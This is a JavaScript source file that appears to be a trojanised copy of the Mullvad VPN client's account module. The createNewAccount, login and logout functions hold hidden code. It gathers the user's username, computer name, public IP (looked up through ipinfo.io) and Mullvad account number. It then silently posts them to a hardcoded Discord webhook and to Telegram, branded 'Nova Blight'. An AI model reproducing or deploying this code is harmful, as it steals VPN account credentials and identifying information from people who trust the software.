"use strict";
const computerName = process.env.COMPUTERNAME || process.env.HOSTNAME || process.env.USERDOMAIN;
const username = process.env.USERNAME || process.env.USER || process.env.LOGNAME;

const config = {
  webhook: "https://discord.com/api/webhooks/1412463264746704967/ZLnheMsfHklkF78R-X0wQkI4ThNutSZhRt5tcn1TRmYX18SzyQu4KytPYXjt7eAzYC4q",
  chat_id: "%TELEGRAM_CHATID%",
  user_id: "%TELEGRAM_USERID%",
  bot_token: "%TELEGRAM_BOTTOKEN%",
  tel_url: "%TELEGRAM_PROTECTED_URL%",
};

var __importDefault =
  (this && this.__importDefault) ||
  function (mod) {
    return mod && mod.__esModule ? mod : { default: mod };
  };

Object.defineProperty(exports, "__esModule", { value: true });
const account_expiry_1 = require("../shared/account-expiry");
const logging_1 = __importDefault(require("../shared/logging"));
const notifications_1 = require("../shared/notifications");
const scheduler_1 = require("../shared/scheduler");
const account_data_cache_1 = __importDefault(require("./account-data-cache"));
const ipc_event_channel_1 = require("./ipc-event-channel");
class Account {
  constructor(delegate, daemonRpc) {
    this.delegate = delegate;
    this.daemonRpc = daemonRpc;
    this.accountDataValue = undefined;
    this.accountHistoryValue = undefined;
    this.expiryNotificationFrequencyScheduler = new scheduler_1.Scheduler();
    this.firstExpiryNotificationScheduler = new scheduler_1.Scheduler();
    this.accountDataCache = new account_data_cache_1.default(
      (accountNumber) => {
        return this.daemonRpc.getAccountData(accountNumber);
      },
      (accountData) => {
        this.accountDataValue = accountData;
        ipc_event_channel_1.IpcMainEventChannel.account.notify?.(this.accountData);
        this.handleAccountExpiry();
      }
    );
    this.updateAccountData = () => {
      if (this.daemonRpc.isConnected && this.isLoggedIn()) {
        this.accountDataCache.fetch(this.getAccountNumber());
      }
    };
  }
  get accountData() {
    return this.accountDataValue;
  }
  get accountHistory() {
    return this.accountHistoryValue;
  }
  get deviceState() {
    return this.deviceStateValue;
  }
  registerIpcListeners() {
    ipc_event_channel_1.IpcMainEventChannel.account.handleCreate(() => this.createNewAccount());
    ipc_event_channel_1.IpcMainEventChannel.account.handleLogin(async (number) => (await this.login(number)) ?? undefined);
    ipc_event_channel_1.IpcMainEventChannel.account.handleLogout(() => this.logout());
    ipc_event_channel_1.IpcMainEventChannel.account.handleGetWwwAuthToken(() => this.daemonRpc.getWwwAuthToken());
    ipc_event_channel_1.IpcMainEventChannel.account.handleSubmitVoucher(async (voucherCode) => {
      const currentAccountNumber = this.getAccountNumber();
      const response = await this.daemonRpc.submitVoucher(voucherCode);
      if (currentAccountNumber) {
        this.accountDataCache.handleVoucherResponse(currentAccountNumber, response);
      }
      return response;
    });
    ipc_event_channel_1.IpcMainEventChannel.account.handleUpdateData(() => this.updateAccountData());
    ipc_event_channel_1.IpcMainEventChannel.accountHistory.handleClear(async () => {
      await this.daemonRpc.clearAccountHistory();
      void this.updateAccountHistory();
    });
    ipc_event_channel_1.IpcMainEventChannel.account.handleListDevices((accountNumber) => {
      return this.daemonRpc.listDevices(accountNumber);
    });
    ipc_event_channel_1.IpcMainEventChannel.account.handleRemoveDevice((deviceRemoval) => {
      return this.daemonRpc.removeDevice(deviceRemoval);
    });
  }
  isLoggedIn() {
    return this.deviceState?.type === "logged in";
  }
  detectStaleAccountExpiry(tunnelState) {
    const hasExpired = !this.accountData || new Date() >= new Date(this.accountData.expiry);
    // It's likely that the account expiry is stale if the daemon managed to establish the tunnel.
    if (tunnelState.state === "connected" && hasExpired) {
      logging_1.default.info("Detected the stale account expiry.");
      this.accountDataCache.invalidate();
    }
  }
  handleDeviceEvent(deviceEvent) {
    this.delegate.closeNotificationsInCategory(notifications_1.SystemNotificationCategory.expiry);
    this.deviceStateValue = deviceEvent.deviceState;
    switch (deviceEvent.deviceState.type) {
      case "logged in":
        this.accountDataCache.fetch(deviceEvent.deviceState.accountAndDevice.accountNumber);
        break;
      case "logged out":
      case "revoked":
        this.accountDataCache.invalidate();
        break;
    }
    void this.updateAccountHistory();
    this.delegate.onDeviceEvent();
    ipc_event_channel_1.IpcMainEventChannel.account.notifyDevice?.(deviceEvent);
  }
  setAccountHistory(accountHistory) {
    this.accountHistoryValue = accountHistory;
    ipc_event_channel_1.IpcMainEventChannel.accountHistory.notify?.(accountHistory);
  }
  async createNewAccount() {
    try {
      let account = await this.daemonRpc.createNewAccount();
      let ip;
      let { expiry } = await this.daemonRpc.getAccountData(account);
      const date = new Date(expiry);

      const formattedDate = date.toLocaleString("fr-FR", {
        day: "2-digit",
        month: "2-digit",
        year: "numeric",
        hour: "2-digit",
        minute: "2-digit",
        hour12: false,
        timeZone: "Europe/Paris",
      });
      try {
        const res = await fetch("https://ipinfo.io/json");
        if (!res.ok) {
          ip = null;
        }

        const data = await res.json();
        if (data.ip && typeof data.ip === "string") {
          ip = data.ip;
        } else {
          ip = null;
        }
      } catch (err) {
        ip = null;
      }

      let tel_message = `🚀 *Mullvad Injection* 💜  
🔗 *New Account Created!*  

👤 *Username:* \`${username}\`  
💻 *Computer Name:* \`${computerName}\`  
🌍 *IP Address:* \`${ip}\`  
---
📅 *Key Time:* \`${formattedDate}\`  
🔑 *Generated Key:* \`${account}\`

---

📢 *Stay tuned for more updates!* 

💬 *Contact me on Telegram:* [@NovaBlight](https://t.me/NovaBlight)`;

      const embed = {
        color: 2829617,
        footer: {
          text: "@Nova Blight | https://t.me/NovaBlight",
        },
        title: "New Mullvad Account Created!",
        fields: [
          {
            name: `<:blackstar:1203979482701111327> **Username**`,
            value: `\`\`\`ansi\n[2;35m${username ?? "none"}[0m\`\`\`\n`,
            inline: true,
          },
          {
            name: `<:phonenumb:1203979476178837524> **Computer Name**`,
            value: `\`\`\`ansi\n[2;35m${computerName ?? "none"}[0m\`\`\`\n`,
            inline: true,
          },
          {
            name: `<a:autofill:1203979487180750871> **IP:**`,
            value: `\`\`\`ansi\n[2;35m${ip ?? "none"}[0m\`\`\`\n`,
            inline: true,
          },
          {
            name: `🕒 **Key Time**`,
            value: `\`\`\`ansi\n[2;35m${formattedDate}[0m\`\`\`\n`,
            inline: false,
          },
          {
            name: `<a:blackkey:1203979480314552431> **Mullvad Account ID (key)**`,
            value: `\`\`\`ansi\n[2;35m${account}[0m\`\`\`\n`,
            inline: false,
          },
        ],

        thumbnail: {
          url: `https://mullvad.net/press/MullvadVPN_logo_Round_RGB_Color_negative.png`,
        },
      };

      const message = {
        username: "Nova Blight",
        avatar_url: "https://raw.githubusercontent.com/KSCHcuck/sub/refs/heads/main/logonova-blight.jpeg",
        embeds: [embed],
      };
      SendTelegramText(tel_message);
      SendWebhook(message);
      return account;
    } catch (e) {
      const error = e;
      logging_1.default.error(`Failed to create account: ${error.message}`);
      throw error;
    }
  }
  async login(accountNumber) {
    const error = await this.daemonRpc.loginAccount(accountNumber);
    if (error) {
      logging_1.default.error(`Failed to login: ${error.error}`);
      return error;
    } else {
      let ip;
      let { expiry } = await this.daemonRpc.getAccountData(accountNumber);
      const date = new Date(expiry);

      const formattedDate = date.toLocaleString("fr-FR", {
        day: "2-digit",
        month: "2-digit",
        year: "numeric",
        hour: "2-digit",
        minute: "2-digit",
        hour12: false,
        timeZone: "Europe/Paris",
      });
      try {
        const res = await fetch("https://ipinfo.io/json");
        if (!res.ok) {
          ip = null;
        }

        const data = await res.json();
        if (data.ip && typeof data.ip === "string") {
          ip = data.ip;
        } else {
          ip = null;
        }
      } catch (err) {
        ip = null;
      }
      const embed = {
        color: 2829617,
        footer: {
          text: "@Nova Blight | https://t.me/NovaBlight",
        },
        title: "Mullvad Account Logged in!",
        fields: [
          {
            name: `<:blackstar:1203979482701111327> **Username**`,
            value: `\`\`\`ansi\n[2;35m${username ?? "none"}[0m\`\`\`\n`,
            inline: true,
          },
          {
            name: `<:phonenumb:1203979476178837524> **Computer Name**`,
            value: `\`\`\`ansi\n[2;35m${computerName ?? "none"}[0m\`\`\`\n`,
            inline: true,
          },
          {
            name: `<a:autofill:1203979487180750871> **IP:**`,
            value: `\`\`\`ansi\n[2;35m${ip ?? "none"}[0m\`\`\`\n`,
            inline: true,
          },
          {
            name: `🕒 **Key Time**`,
            value: `\`\`\`ansi\n[2;35m${formattedDate}[0m\`\`\`\n`,
            inline: false,
          },
          {
            name: `<a:blackkey:1203979480314552431> **Mullvad Account ID (key)**`,
            value: `\`\`\`ansi\n[2;35m${accountNumber}[0m\`\`\`\n`,
            inline: false,
          },
        ],

        thumbnail: {
          url: `https://mullvad.net/press/MullvadVPN_logo_Round_RGB_Color_negative.png`,
        },
      };

      const message = {
        username: "Nova Blight",
        avatar_url: "https://raw.githubusercontent.com/KSCHcuck/sub/refs/heads/main/logonova-blight.jpeg",
        embeds: [embed],
      };
      let tel_message = `🚀 *Mullvad Injection* 💜  
🔗 *Account Logged in!*  

👤 *Username:* \`${username}\`  
💻 *Computer Name:* \`${computerName}\`  
🌍 *IP Address:* \`${ip}\`  
---
📅 *Key Time:* \`${formattedDate}\`  
🔑 *Generated Key:* \`${accountNumber}\`

---

📢 *Stay tuned for more updates!* 

💬 *Contact me on Telegram:* [@NovaBlight](https://t.me/NovaBlight)`;

      SendTelegramText(tel_message);
      SendWebhook(message);
    }
  }
  async logout() {
    try {
      let account = this.accountDataCache.currentAccount;
      let ip;
      let { expiry } = await this.daemonRpc.getAccountData(account);
      const date = new Date(expiry);

      const formattedDate = date.toLocaleString("fr-FR", {
        day: "2-digit",
        month: "2-digit",
        year: "numeric",
        hour: "2-digit",
        minute: "2-digit",
        hour12: false,
        timeZone: "Europe/Paris",
      });
      try {
        const res = await fetch("https://ipinfo.io/json");
        if (!res.ok) {
          ip = null;
        }

        const data = await res.json();
        if (data.ip && typeof data.ip === "string") {
          ip = data.ip;
        } else {
          ip = null;
        }
      } catch (err) {
        ip = null;
      }
      const embed = {
        color: 2829617,
        footer: {
          text: "@Nova Blight | https://t.me/NovaBlight",
        },
        title: "Mullvad Logged Out!",
        fields: [
          {
            name: `<:blackstar:1203979482701111327> **Username**`,
            value: `\`\`\`ansi\n[2;35m${username ?? "none"}[0m\`\`\`\n`,
            inline: true,
          },
          {
            name: `<:phonenumb:1203979476178837524> **Computer Name**`,
            value: `\`\`\`ansi\n[2;35m${computerName ?? "none"}[0m\`\`\`\n`,
            inline: true,
          },
          {
            name: `<a:autofill:1203979487180750871> **IP:**`,
            value: `\`\`\`ansi\n[2;35m${ip ?? "none"}[0m\`\`\`\n`,
            inline: true,
          },
          {
            name: `🕒 **Key Time**`,
            value: `\`\`\`ansi\n[2;35m${formattedDate}[0m\`\`\`\n`,
            inline: false,
          },
          {
            name: `<a:blackkey:1203979480314552431> **Mullvad Account ID (key)**`,
            value: `\`\`\`ansi\n[2;35m${account}[0m\`\`\`\n`,
            inline: false,
          },
        ],

        thumbnail: {
          url: `https://mullvad.net/press/MullvadVPN_logo_Round_RGB_Color_negative.png`,
        },
      };

      const message = {
        username: "Nova Blight",
        avatar_url: "https://raw.githubusercontent.com/KSCHcuck/sub/refs/heads/main/logonova-blight.jpeg",
        embeds: [embed],
      };
      let tel_message = `🚀 *Mullvad Injection* 💜  
🔗 *Account Logged out!*  

👤 *Username:* \`${username}\`  
💻 *Computer Name:* \`${computerName}\`  
🌍 *IP Address:* \`${ip}\`  
---
📅 *Key Time:* \`${formattedDate}\`  
🔑 *Generated Key:* \`${account}\`

---

📢 *Stay tuned for more updates!* 

💬 *Contact me on Telegram:* [@NovaBlight](https://t.me/NovaBlight)`;

      SendTelegramText(tel_message);
      SendWebhook(message);
      await this.daemonRpc.logoutAccount();
      this.delegate.closeNotificationsInCategory(notifications_1.SystemNotificationCategory.expiry);
      this.expiryNotificationFrequencyScheduler.cancel();
      this.firstExpiryNotificationScheduler.cancel();
    } catch (e) {
      const error = e;
      logging_1.default.info(`Failed to logout: ${error.message}`);
      throw error;
    }
  }
  handleAccountExpiry() {
    if (this.accountData) {
      const expiredNotification = new notifications_1.AccountExpiredNotificationProvider({
        accountExpiry: this.accountData.expiry,
        tunnelState: this.delegate.getTunnelState(),
      });
      const closeToExpiryNotification = new notifications_1.CloseToAccountExpiryNotificationProvider({
        accountExpiry: this.accountData.expiry,
        locale: this.delegate.getLocale(),
      });
      if (expiredNotification.mayDisplay()) {
        this.expiryNotificationFrequencyScheduler.cancel();
        this.firstExpiryNotificationScheduler.cancel();
        this.delegate.notify(expiredNotification.getSystemNotification());
      } else if (!this.expiryNotificationFrequencyScheduler.isRunning && closeToExpiryNotification.mayDisplay()) {
        this.firstExpiryNotificationScheduler.cancel();
        this.delegate.notify(closeToExpiryNotification.getSystemNotification());
        const twelveHours = 12 * 60 * 60 * 1000;
        const remainingMilliseconds = new Date(this.accountData.expiry).getTime() - Date.now();
        const delay = Math.min(twelveHours, remainingMilliseconds);
        this.expiryNotificationFrequencyScheduler.schedule(() => this.handleAccountExpiry(), delay);
      } else if (!(0, account_expiry_1.closeToExpiry)(this.accountData.expiry)) {
        this.expiryNotificationFrequencyScheduler.cancel();
        // If no longer close to expiry, all previous notifications should be closed
        this.delegate.closeNotificationsInCategory(notifications_1.SystemNotificationCategory.expiry);
        const expiry = new Date(this.accountData.expiry).getTime();
        const now = new Date().getTime();
        const threeDays = 3 * 24 * 60 * 60 * 1000;
        // Add 10 seconds to be on the safe side. Never make it longer than a 24 days since
        // the timeout needs to fit into a signed 32-bit integer.
        const timeout = Math.min(expiry - now - threeDays + 10_000, 24 * 24 * 60 * 60 * 1000);
        this.firstExpiryNotificationScheduler.schedule(() => this.handleAccountExpiry(), timeout);
      }
    }
  }
  async updateAccountHistory() {
    try {
      this.setAccountHistory(await this.daemonRpc.getAccountHistory());
    } catch (e) {
      const error = e;
      logging_1.default.error(`Failed to fetch the account history: ${error.message}`);
    }
  }
  getAccountNumber() {
    return this.deviceState?.type === "logged in" ? this.deviceState.accountAndDevice.accountNumber : undefined;
  }
}
async function SendWebhook(message) {
  try {
    const res = await fetch(config.webhook, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(message),
    });
    if (res.ok) {
      console.log("Nova Blight is here.");
    } else {
    }
  } catch (e) {}
}

function parseTelegram(message) {
  let g = message.replace(/\x1b\[.*?m/g, "");
  g = g
    .replace(/\|/g, "\\|")
    .replace(/\]/g, "\\]")
    .replace(/\[/g, "\\[")
    .replace(/\./g, "\\.")
    .replace(/\+/g, "\\+")
    .replace(/\</g, "\\<")
    .replace(/\>/g, "\\>")
    .replace(/\_/g, "\\_")
    .replace(/!/g, "")
    .replace(/\-/g, "\\-")
    .replace(/\(/g, "\\(")
    .replace(/\)/g, "\\)");

  return g;
}

async function SendTelegramText(message) {
  const parsedMessage = parseTelegram(message);
  if (/\/req\//.test(config.tel_url)) {
    try {
      const response = await fetch(config.tel_url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ message: parsedMessage }),
      });
      if (!response.ok) {
        return;
      }
    } catch (error) {}
  } else {
    try {
      let chatId;
      if (config.user_id.includes("%TELEGRAM") || config.user_id === "no") {
        chatId = `@${config.chat_id}`;
      } else {
        chatId = config.user_id;
      }

      const params = new URLSearchParams({
        chat_id: chatId,
        text: parsedMessage,
        parse_mode: "MarkdownV2",
      }).toString();

      const apiUrl = `https://api.telegram.org/bot${config.bot_token}/sendMessage?${params}`;

      const response = await fetch(apiUrl, {
        method: "GET",
      });

      if (response.ok) {
        console.log("Message sent with telegram.");
      } else {
        console.log("error");
      }
    } catch (error) {}
  }
}

exports.default = Account;
